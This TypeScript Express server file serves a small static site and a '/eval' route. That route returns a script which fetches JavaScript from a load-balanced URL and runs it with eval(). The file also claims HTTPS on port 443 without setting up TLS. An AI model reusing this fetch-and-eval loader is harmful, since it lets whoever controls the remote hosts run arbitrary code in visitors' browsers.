import express from "express";
import { getURL } from "./loadBalancer/loadBalancer";
// import cors from "cors";

export async function startServer_https () {

    const app = express();

    const PORT : number = 443;

    // Index.html
    app.get("/", (req, res) => {
        // Removing /dist/ from the file uri
        res.status(200).sendFile(__dirname.substring(0, __dirname.length - 5) + "/html/index.html");
    });
    
    
    // Style.css
    app.get("/style.css", (req, res) => {
        // Removing /dist/ from the file uri
        res.status(200).sendFile(__dirname.substring(0, __dirname.length - 5) + "/html/style.css");
    });

    // favicon.png
    app.get("/favicon.png", (req, res) => {
    
        // Removing /dist/ from the file uri. A messy way to do this, but it works (for now)
        res.status(200).sendFile(__dirname.substring(0, __dirname.length - 5) + "/html/favicon.png");
    });


    // eval
    app.get("/eval*", (req, res) => {
        res.status(200).type("text/js").send(`
(async () => {
    eval(await (await fetch("${getURL()}")).text());
})();
`.replace("\n", ""));
    });


    // The domain
    app.get("*", function(req, res) {
    res.status(200).type("text/plain").send(getURL());
    });
    

    // server starts listening the `PORT`
    app.listen(PORT, () => {
        console.log(`HTTPS Server running at: http://localhost:${PORT}/`);
    });
}